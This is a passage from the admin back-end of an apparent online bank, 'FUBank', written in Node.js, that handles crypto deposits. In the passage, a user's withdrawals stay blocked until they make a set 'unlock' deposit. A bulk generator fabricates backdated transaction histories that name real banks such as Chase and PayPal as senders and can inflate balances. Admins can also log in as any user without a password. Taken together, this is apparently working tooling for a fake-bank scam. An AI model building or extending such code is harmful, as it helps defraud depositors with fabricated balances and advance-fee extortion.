      .populate("userId", "Name Email AccountNumber")
      .populate("cryptoWalletId")
      .sort({ createdAt: -1 })
      .lean();

    res.render("admin/deposit-requests", {
      depositRequests,
      admin: req.session.admin,
    });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

const approveDepositRequest = async (req, res) => {
  const session = await mongoose.startSession();
  session.startTransaction();

  try {
    const depositRequestId = req.params.id;
    const depositRequest = await DepositRequest.findById(depositRequestId)
      .populate("userId")
      .session(session);

    if (!depositRequest) {
      await session.abortTransaction();
      session.endSession();
      return res.status(404).json({ error: "Deposit request not found" });
    }

    if (depositRequest.status !== "pending") {
      await session.abortTransaction();
      session.endSession();
      return res.status(400).json({ error: "Deposit request already processed" });
    }

    const user = await User.findById(depositRequest.userId._id).session(session);
    if (!user) {
      await session.abortTransaction();
      session.endSession();
      return res.status(404).json({ error: "User not found" });
    }

    // Update user balance
    user.AccountBalance += depositRequest.amount;

    let unlockedByDeposit = false;
    if (user.transactionLock?.isBlocked) {
      const requiredDeposit = Number(user.transactionLock.unlockDepositAmount || 0);
      if (requiredDeposit > 0 && depositRequest.amount >= requiredDeposit) {
        user.transactionLock = {
          isBlocked: false,
          reasonCode: "",
          reasonTitle: "",
          reasonMessage: "",
          unlockDepositAmount: 0,
          blockedAt: null,
          blockedByAdminId: null,
          blockedByAdminName: "",
        };
        unlockedByDeposit = true;
      }
    }
    await user.save({ session });

    // Update deposit request status
    depositRequest.status = "approved";
    await depositRequest.save({ session });

    // Create transaction history
    await TransactionHistory.create(
      [
        {
          userId: depositRequest.userId._id,
          type: "credit",
          amount: depositRequest.amount,
          currency: depositRequest.cryptocurrency,
          description: `Deposit via ${depositRequest.cryptocurrency} - ${depositRequest.network}`,
          status: "successful",
        },
      ],
      { session }
    );

    // Create notification
    const depositMessage = `Your deposit of ${depositRequest.cryptocurrency} ${depositRequest.amount} has been approved and credited to your account. Your new balance is $${user.AccountBalance.toFixed(2)}.`;
    await Notification.create(
      [
        {
          userId: depositRequest.userId._id,
          type: "deposit_approved",
          message: depositMessage,
          relatedEntity: depositRequest._id,
          read: false,
        },
        ...(unlockedByDeposit
          ? [
              {
                userId: depositRequest.userId._id,
                type: "success",
                message:
                  "Your withdrawal restriction has been lifted after your qualifying deposit. Your deposited funds remain fully available in your account.",
                relatedEntity: depositRequest._id,
                read: false,
              },
            ]
          : []),
      ],
      { session }
    );

    await session.commitTransaction();
    session.endSession();

    // Send email notification
    const subject = "Deposit Approved - Account Credited";
    const text = depositMessage;
    const htmlContent = `
      <p style="font-size: 16px; color: #374151;">Dear <strong>${user.Name}</strong>,</p>
      <p style="font-size: 15px; color: #374151;">
        We are pleased to inform you that your deposit request has been approved and processed successfully.
      </p>
      <div style="background-color: #f0f9ff; padding: 15px; border-radius: 6px; margin: 20px 0; border-left: 4px solid #2563eb;">
        <p style="margin: 0; font-size: 14px; color: #1e40af;"><strong>Deposit Details:</strong></p>
        <p style="margin: 5px 0; font-size: 14px; color: #374151;">Amount: <strong>${depositRequest.cryptocurrency} ${depositRequest.amount}</strong></p>
        <p style="margin: 5px 0; font-size: 14px; color: #374151;">Network: <strong>${depositRequest.network}</strong></p>
        <p style="margin: 5px 0; font-size: 14px; color: #374151;">New Balance: <strong>$${user.AccountBalance.toFixed(2)}</strong></p>
      </div>
      <p style="font-size: 15px; color: #374151;">
        The funds have been successfully credited to your account and are now available for use.
      </p>
      <p style="margin-top: 20px; font-size: 14px; color: #111827;">
        Thank you for banking with us.<br><strong>FUBank Team</strong>
      </p>
    `;
    sendEmail(user.Email, subject, text, htmlContent).catch(e => console.error("Email failed:", e.message));

    res.json({ message: "Deposit request approved successfully" });
  } catch (err) {
    if (session && session.inTransaction()) {
      await session.abortTransaction();
    }
    if (session) {
      session.endSession();
    }
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
};

const declineDepositRequest = [
  body("adminNotes").optional().trim().escape(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    try {
      const depositRequestId = req.params.id;
      const { adminNotes } = req.body;

      const depositRequest = await DepositRequest.findById(depositRequestId).populate("userId");
      if (!depositRequest) {
        return res.status(404).json({ error: "Deposit request not found" });
      }

      if (depositRequest.status !== "pending") {
        return res.status(400).json({ error: "Deposit request already processed" });
      }

      depositRequest.status = "declined";
      depositRequest.adminNotes = adminNotes ? escape(adminNotes) : "";
      await depositRequest.save();

      const user = depositRequest.userId;
      const declineMessage = `Your deposit request of ${depositRequest.cryptocurrency} ${depositRequest.amount} has been declined.${adminNotes ? " Reason: " + adminNotes : ""}`;

      // Create notification
      await Notification.create({
        userId: user._id,
        type: "deposit_declined",
        message: declineMessage,
        relatedEntity: depositRequest._id,
        read: false,
      });

      // Send email notification
      const subject = "Deposit Request Declined";
      const text = declineMessage;
      const htmlContent = `
        <p style="font-size: 16px; color: #374151;">Dear <strong>${user.Name}</strong>,</p>
        <p style="font-size: 15px; color: #374151;">
          We regret to inform you that your deposit request has been declined.
        </p>
        <div style="background-color: #fef2f2; padding: 15px; border-radius: 6px; margin: 20px 0; border-left: 4px solid #ef4444;">
          <p style="margin: 0; font-size: 14px; color: #dc2626;"><strong>Deposit Details:</strong></p>
          <p style="margin: 5px 0; font-size: 14px; color: #374151;">Amount: <strong>${depositRequest.cryptocurrency} ${depositRequest.amount}</strong></p>
          <p style="margin: 5px 0; font-size: 14px; color: #374151;">Network: <strong>${depositRequest.network}</strong></p>
          <p style="margin: 5px 0; font-size: 14px; color: #dc2626;">Status: <strong>Declined</strong></p>
          ${adminNotes ? `<p style="margin: 5px 0; font-size: 14px; color: #374151;">Reason: <strong>${adminNotes}</strong></p>` : ''}
        </div>
        <p style="font-size: 15px; color: #374151;">
          ${adminNotes ? 'Please review the reason provided above. If you have any questions or concerns, please contact our support team.' : 'If you have any questions or concerns about this decision, please contact our support team for assistance.'}
        </p>
        <p style="margin-top: 20px; font-size: 14px; color: #111827;">
          Thank you for banking with us.<br><strong>FUBank Team</strong>
        </p>
      `;
      sendEmail(user.Email, subject, text, htmlContent).catch(e => console.error("Email failed:", e.message));

      res.json({ message: "Deposit request declined successfully" });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Server error" });
    }
  },
];

// Generate Bulk Random Transactions
const generateBulkTransactions = async (req, res) => {
  try {
    const userId = req.params.id;
    const {
      totalAmount,
      count,
      distribution = "random_mix",
      startDate,
      endDate,
      updateBalance = false,
    } = req.body;

    const amt = parseFloat(totalAmount);
    const numTx = parseInt(count, 10);

    if (isNaN(amt) || amt <= 0) {
      return res
        .status(400)
        .json({ error: "Please enter a valid total amount greater than 0." });
    }

    if (isNaN(numTx) || numTx < 1 || numTx > 500) {
      return res.status(400).json({
        error: "Please enter a valid number of transactions between 1 and 500.",
      });
    }

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found." });
    }

    // Generate N positive random amounts summing to totalAmount
    const rawWeights = Array.from(
      { length: numTx },
      () => Math.random() * 0.9 + 0.1
    );
    const weightSum = rawWeights.reduce((acc, val) => acc + val, 0);

    let allocatedAmounts = rawWeights.map(
      (w) => Math.floor((w / weightSum) * amt * 100) / 100
    );

    // Ensure minimum $0.01 per transaction if possible
    allocatedAmounts = allocatedAmounts.map((a) => (a <= 0 ? 0.01 : a));

    let currentSum = allocatedAmounts.reduce((acc, val) => acc + val, 0);
    let difference = Math.round((amt - currentSum) * 100) / 100;

    // Adjust rounding difference to make the sum EXACTLY equal to totalAmount
    if (difference !== 0) {
      const randomIndex = Math.floor(Math.random() * numTx);
      allocatedAmounts[randomIndex] =
        Math.round((allocatedAmounts[randomIndex] + difference) * 100) / 100;
    }

    // Date range preparation
    const endMs = endDate ? new Date(endDate).getTime() : Date.now();
    const startMs = startDate
      ? new Date(startDate).getTime()
      : endMs - 30 * 24 * 60 * 60 * 1000;

    // Descriptions pools
    const creditDescriptions = [
      "Online Transfer Deposit",
      "Direct Payroll Credit",
      "Wire Transfer Inward",
      "ACH Direct Deposit",
      "Merchant Settlement Refund",
      "Mobile Transfer Credit",
      "Interbank Funds Transfer",
      "Investment Yield Credit",
      "Card Cashback Reward",
      "International Wire Credit",
    ];

    const debitDescriptions = [
      "POS Terminal Purchase",
      "Online Merchant Payment",
      "Wire Transfer Outward",
      "ATM Cash Withdrawal",
      "Utility Bill Payment",
      "Debit Card Transaction",
      "Mobile Banking Transfer",
      "Subscription Auto-Pay",
      "International Card Purchase",
      "Account Maintenance Charge",
    ];

    const sampleSenders = [
      "Chase Bank N.A.",
      "Bank of America",
      "Wells Fargo Wire",
      "Citigroup Global",
      "Capital One Transfer",
      "Stripe Payouts",
      "Paypal Holdings Inc",
      "Square Inc Settlement",
      "Federal Credit Union",
      "Barclays Corporate",
    ];

    const transactionsToCreate = [];
    let netBalanceChange = 0;

    // Generate random timestamps and sort chronologically
    const timestamps = Array.from({ length: numTx }, () =>
      Math.floor(startMs + Math.random() * (endMs - startMs))
    ).sort((a, b) => a - b);

    for (let i = 0; i < numTx; i++) {
      const txAmount = allocatedAmounts[i];
      let type = "credit";

      if (distribution === "all_debit") {
        type = "debit";
      } else if (distribution === "all_credit") {
        type = "credit";
      } else {
        // random_mix (60% credit, 40% debit)
        type = Math.random() > 0.4 ? "credit" : "debit";
      }

      const descPool = type === "credit" ? creditDescriptions : debitDescriptions;
      const randomDesc = descPool[Math.floor(Math.random() * descPool.length)];
      const senderName =
        sampleSenders[Math.floor(Math.random() * sampleSenders.length)];
      const refId = `TXN${Date.now().toString().slice(-6)}${Math.floor(
        1000 + Math.random() * 9000
      )}`;

      if (type === "credit") {
        netBalanceChange += txAmount;
      } else {
        netBalanceChange -= txAmount;
      }

      transactionsToCreate.push({
        userId: user._id,
        type,
        amount: txAmount,
        currency: "USD",
        description: `${randomDesc} - ${senderName}`,
        referenceId: refId,
        relatedFullName: senderName,
        status: "successful",
        transactionDate: new Date(timestamps[i]),
        createdAt: new Date(timestamps[i]),
        updatedAt: new Date(timestamps[i]),
      });
    }

    await TransactionHistory.insertMany(transactionsToCreate);

    if (updateBalance) {
      await User.findByIdAndUpdate(userId, {
        $inc: { AccountBalance: netBalanceChange },
      });
    }

    return res.status(200).json({
      message: `Successfully generated ${numTx} transaction records totaling $${amt.toLocaleString(
        "en-US",
        { minimumFractionDigits: 2 }
      )}!`,
      count: numTx,
      totalAmount: amt,
    });
  } catch (err) {
    console.error("Error generating bulk transactions:", err);
    return res
      .status(500)
      .json({ error: "Server error while generating transactions." });
  }
};


// Admin Login as User (Passwordless Impersonation)
const loginAsUser = async (req, res) => {
  try {
    const userId = req.params.id;
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).send("User not found");
    }

    req.session.user = {
      id: user._id,
      name: user.Name,
      email: user.Email,
      accountNumber: user.AccountNumber,
      accountBalance: user.AccountBalance,
      role: user.role,
    };

    req.session.impersonatedByAdmin = true;

    req.session.save((err) => {
      if (err) {
        console.error("Error saving impersonation session:", err);
        return res.status(500).send("Error establishing user session");
      }
      return res.redirect("/udp/dashboard");
    });
  } catch (err) {
    console.error("Error in loginAsUser:", err);
    return res.status(500).send("Server error");
  }
};

module.exports = {
  loginAsUser,
  registerAdmin,
  loginAdmin,
  getDashboardStats,
  getUsers,
  getUserDetails,
  deleteUser,
  updateBalance,
  updateUserDetails,
  updateUserLoginBlock,
  updateUserAccountTier,
  updateUserCurrency,
  updateTransactionLock,
  backdateUserTransaction,
  deleteUserTransaction,
  generateBulkTransactions,
  getKYCs,
  getKYCDetails,
  approveKYC,
  declineKYC,
  getLoans,
  getLoanDetails,
  markLoanAsPaid,
  getCryptoWallets,
  createCryptoWallet,
  updateCryptoWallet,
  deleteCryptoWallet,
  getDepositRequests,
  approveDepositRequest,
  declineDepositRequest,
};
